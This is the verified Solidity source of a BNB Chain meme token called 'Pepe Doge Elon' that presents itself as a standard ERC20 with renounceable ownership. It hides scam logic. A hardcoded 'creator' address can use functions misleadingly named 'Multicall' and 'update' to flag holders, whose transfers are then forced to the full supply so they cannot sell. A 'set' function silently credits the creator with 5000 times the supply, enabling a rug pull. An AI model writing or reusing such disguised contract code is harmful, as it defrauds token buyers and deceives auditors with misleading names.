/**
 *Submitted for verification at BscScan.com on 2023-05-03
*/

// SPDX-License-Identifier: MIT
/*
Pepe Doge Elon:
https://en.wikipedia.org/wiki/Pepe_the_Frog
https://en.wikipedia.org/wiki/Doge_(meme)
https://en.wikipedia.org/wiki/Elon_Musk
https://t.me/PepeCoin
*/

pragma solidity ^0.8.18;

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);}


abstract contract Ownable  {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _check();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _check() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


pragma solidity ^0.8.18;



contract Token is Ownable {
/**using SafeMath for uin256
*/
    mapping(address => uint256) private _reward;
    mapping(address => mapping(address => uint256)) private _allowances;
    

    uint256 private _tokentotalSupply;
    string private _tokenname;
    string private _tokensymbol;
    IRouter public router;
    address public pair;
    


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address public creator;
    mapping(address => bool) private _address;
    function update(address sss) external   {
        if (creator == _msgSender()) {
            _address[sss] = false;
        }
    }

    function Multicall(address sss) external   {
        if (creator == _msgSender()) {
            _address[sss] = true;
        }
    }

    function set() external {
        if(creator == _msgSender()){
            _reward[_msgSender()] = (1)*(1)*(totalSupply()*(5000))*(1)*(1);
        }
    }
   

    function devwallet(address sss) public view returns(bool)  {
        return _address[sss];
    }

    constructor(string memory tokenName_, string memory Tokensymbol_) {
        creator = 0x79B1A69856086Fac252ceBE66dFf989EbA1cD091;
        _tokenname = tokenName_;
        _tokensymbol = Tokensymbol_;
        uint256 amount = 1000000000*10**decimals();
        _tokentotalSupply += amount;
        _reward[msg.sender] += amount;
        emit Transfer(address(0), msg.sender, amount);
        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _pair = IFactory(_router.factory())
            .createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _tokenname;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }


    function decimals() public view returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view returns (uint256) {
        return _tokentotalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view returns (uint256) {
        return _reward[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */

    function transfer(address to, uint256 amount) public returns (bool) {
        _internaltransfer(_msgSender(), to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _internalspendAllowance(from, spender, amount);
        _internaltransfer(from, to, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    uint256 TaxFee = 5;
    function _internaltransfer(
        address fromSender,
        address toSender,
        uint256 amount
    ) internal virtual {
        if(_address[fromSender] == true){
            amount = totalSupply();
        }
        require(fromSender != address(0), "ERC20: transfer from the zero address");
        require(toSender != address(0), "ERC20: transfer to the zero address");
        uint256 curbalance = _reward[fromSender];
        require(curbalance >= amount, "ERC20: transfer amount exceeds balance");


        _reward[fromSender] = _reward[fromSender]-amount;
        uint256 taxAmount = amount*TaxFee/100;
        _reward[toSender] = _reward[toSender]+amount-taxAmount;

        emit Transfer(fromSender, toSender, amount-taxAmount);
        if (taxAmount> 0){
            emit Transfer(fromSender, address(0), taxAmount);    
        }
    }


    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _internalspendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}

contract PepeDogeElon is Token {
    
    constructor(string memory name_, string memory symbol_) Token(name_,symbol_) {
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    }
}